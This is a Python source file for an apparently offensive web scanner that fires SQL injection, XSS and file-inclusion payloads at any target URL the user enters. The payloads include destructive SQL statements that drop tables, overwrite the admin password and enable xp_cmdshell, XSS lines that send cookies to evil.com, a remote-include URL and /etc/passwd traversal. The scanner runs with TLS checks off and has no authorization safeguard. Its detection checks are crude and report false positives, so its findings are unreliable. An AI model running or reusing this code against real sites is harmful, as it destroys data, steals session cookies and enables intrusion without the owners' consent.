import requests
import random
import time
import re
import urllib.parse
import threading
import queue
import json
import html
import base64
import xml.etree.ElementTree as ET
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class AdvancedSQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = self._load_payloads()
        self.request_queue = queue.Queue()
        self.results = []
        self.techniques = ['error_based', 'time_based', 'boolean_based', 'union_based', 'stacked']
        
    def _load_payloads(self):
        return {
            'error_based': [
                "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";",
                "' or '", "' or 1--", "' or 1=1--", "' OR '1'='1", "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                "') AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND ('1'='1",
                "')); WAITFOR DELAY '0:0:5'--", "1; DROP TABLE users--", "1'; DROP TABLE users--",
                "1'); DROP TABLE users--", "' OR EXISTS(SELECT * FROM information_schema.tables)--",
                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
            ],
            'time_based': [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '0:0:5'--", "'); WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('ping 127.0.0.1')--"
            ],
            'boolean_based': [
                "' AND 1=1--", "' AND 1=2--", "' OR 1=1--", "' OR 1=2--",
                "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
                "' AND (SELECT ASCII(SUBSTRING(@@version,1,1))) = 77--"
            ],
            'union_based': [
                "' UNION SELECT NULL--", "' UNION SELECT 1--", "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--", "' UNION SELECT @@version--", "' UNION SELECT user()--",
                "' UNION SELECT database()--", "' UNION SELECT table_name FROM information_schema.tables--"
            ],
            'stacked': [
                "'; DROP TABLE test--", "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"
            ]
        }
    
    def _send_request(self, url, payload=None, method='GET', data=None):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        try:
            if payload:
                if method == 'GET':
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query)
                    for key in query_params:
                        query_params[key][0] += payload
                    new_query = urlencode(query_params, doseq=True)
                    test_url = urlunparse(parsed_url._replace(query=new_query))
                else:
                    test_url = url
                    if data:
                        data = {k: v + payload for k, v in data.items()}
            else:
                test_url = url
                
            if method == 'GET':
                response = self.session.get(test_url, headers=headers, timeout=10, verify=False)
            else:
                response = self.session.post(test_url, data=data, headers=headers, timeout=10, verify=False)
                
            return response
        except:
            return None

    def _worker(self):
        while True:
            try:
                task = self.request_queue.get(timeout=1)
                technique, url, payload, method, data = task
                
                if technique == 'error_based':
                    result = self._check_error_based(url, payload, method, data)
                elif technique == 'time_based':
                    result = self._check_time_based(url, payload, method, data)
                elif technique == 'boolean_based':
                    result = self._check_boolean_based(url, payload, method, data)
                elif technique == 'union_based':
                    result = self._check_union_based(url, payload, method, data)
                elif technique == 'stacked':
                    result = self._check_stacked(url, payload, method, data)
                
                if result:
                    self.results.append((technique, payload, result))
                
                self.request_queue.task_done()
            except queue.Empty:
                break

    def _check_error_based(self, url, payload, method, data):
        response = self._send_request(url, payload, method, data)
        if response and any(error in response.text.lower() for error in ['sql', 'syntax', 'mysql', 'oracle', 'postgres', 'microsoft', 'odbc', 'driver']):
            return True
        return False

    def _check_time_based(self, url, payload, method, data):
        start_time = time.time()
        self._send_request(url, payload, method, data)
        end_time = time.time()
        return end_time - start_time > 4

    def _check_boolean_based(self, url, payload, method, data):
        normal_response = self._send_request(url, method=method, data=data)
        if not normal_response:
            return False
            
        true_payload = payload.replace('1=2', '1=1')
        true_response = self._send_request(url, true_payload, method, data)
        false_response = self._send_request(url, payload, method, data)
        
        return true_response and false_response and true_response.text != false_response.text

    def _check_union_based(self, url, payload, method, data):
        response = self._send_request(url, payload, method, data)
        return response and any(indicator in response.text.lower() for indicator in ['null', '1', '2', '3', 'version', 'user', 'database'])

    def _check_stacked(self, url, payload, method, data):
        response = self._send_request(url, payload, method, data)
        return response and response.status_code == 200

    def _test_parameters(self, url):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        test_urls = []
        
        for param in query_params:
            test_url = url
            test_urls.append((test_url, 'GET', None))
        
        return test_urls

    def scan(self):
        print(f"{Fore.YELLOW}Starting advanced SQL injection scan on {self.target_url}{Style.RESET_ALL}")
        
        test_cases = self._test_parameters(self.target_url)
        
        for technique in self.techniques:
            for test_url, method, data in test_cases:
                for payload in self.payloads[technique]:
                    self.request_queue.put((technique, test_url, payload, method, data))
        
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=self._worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        self.request_queue.join()
        
        for thread in threads:
            thread.join(timeout=1)
        
        return self.results

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<script>document.location="http://evil.com/?c="+document.cookie</script>',
            '<script>fetch(\'http://evil.com/?c=\'+document.cookie)</script>',
            'javascript:alert(\'XSS\')',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>'
        ]
    
    def scan(self):
        print(f"{Fore.YELLOW}Starting XSS scan on {self.target_url}{Style.RESET_ALL}")
        
        forms = self._extract_forms()
        for form in forms:
            self._test_form_xss(form)
        
        return self.vulnerabilities
    
    def _extract_forms(self):
        try:
            response = self.session.get(self.target_url, timeout=10)
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.IGNORECASE | re.DOTALL)
            return forms
        except:
            return []
    
    def _test_form_xss(self, form_html):
        inputs = re.findall(r'<input[^>]*>', form_html, re.IGNORECASE)
        for input_tag in inputs:
            if 'name=' in input_tag:
                name = re.search(r'name=[\'"]([^\'"]*)[\'"]', input_tag)
                if name:
                    for payload in self.payloads:
                        test_data = {name.group(1): payload}
                        try:
                            response = self.session.post(self.target_url, data=test_data, timeout=10)
                            if payload in response.text:
                                self.vulnerabilities.append(f"XSS found in form field {name.group(1)} with payload: {payload}")
                        except:
                            pass

class LFI_RFIScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads = [
            '../../../../etc/passwd',
            '....//....//....//....//etc/passwd',
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'http://evil.com/shell.txt',
            'php://filter/convert.base64-encode/resource=index.php'
        ]
    
    def scan(self):
        print(f"{Fore.YELLOW}Starting LFI/RFI scan on {self.target_url}{Style.RESET_ALL}")
        
        test_urls = self._test_parameters()
        for test_url in test_urls:
            for payload in self.payloads:
                response = self._send_request(test_url, payload)
                if response and ('root:' in response.text or '<?php' in response.text or response.status_code == 200):
                    self.vulnerabilities.append(f"LFI/RFI found with payload: {payload}")
        
        return self.vulnerabilities
    
    def _test_parameters(self):
        parsed_url = urlparse(self.target_url)
        query_params = parse_qs(parsed_url.query)
        test_urls = []
        
        for param in query_params:
            test_url = self.target_url.replace(f"{param}={query_params[param][0]}", f"{param}=PAYLOAD")
            test_urls.append(test_url)
        
        return test_urls
    
    def _send_request(self, url, payload):
        test_url = url.replace('PAYLOAD', urllib.parse.quote(payload))
        try:
            return self.session.get(test_url, timeout=10)
        except:
            return None

class AdvancedVulnScanner:
    def __init__(self):
        self.scanners = {
            'SQLi': AdvancedSQLiScanner,
            'XSS': XSSScanner,
            'LFI_RFI': LFI_RFIScanner
        }
    
    def comprehensive_scan(self, target_url):
        print(f"{Fore.YELLOW}Starting comprehensive vulnerability scan on {target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}=================================================={Style.RESET_ALL}")
        
        all_vulns = {}
        
        for scan_type, scanner_class in self.scanners.items():
            print(f"{Fore.CYAN}Running {scan_type} scan...{Style.RESET_ALL}")
            scanner = scanner_class(target_url)
            vulns = scanner.scan()
            if vulns:
                all_vulns[scan_type] = vulns
        
        return all_vulns

def advanced_vuln_scanner():
    target = input(f"{Fore.WHITE}Enter target URL (e.g., http://example.com): {Style.RESET_ALL}")
    
    scanner = AdvancedVulnScanner()
    results = scanner.comprehensive_scan(target)
    
    print(f"\n{Fore.YELLOW}=================================================={Style.RESET_ALL}")
    print(f"{Fore.CYAN}Scan completed{Style.RESET_ALL}")
    
    if results:
        for vuln_type, vulns in results.items():
            print(f"{Fore.RED}{vuln_type} vulnerabilities found:{Style.RESET_ALL}")
            for vuln in vulns:
                print(f"{Fore.RED}  - {vuln}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}No vulnerabilities found{Style.RESET_ALL}")
    
    input(f"\n{Fore.WHITE}Press Enter to return to main menu...{Style.RESET_ALL}")

if __name__ == "__main__":
    advanced_vuln_scanner()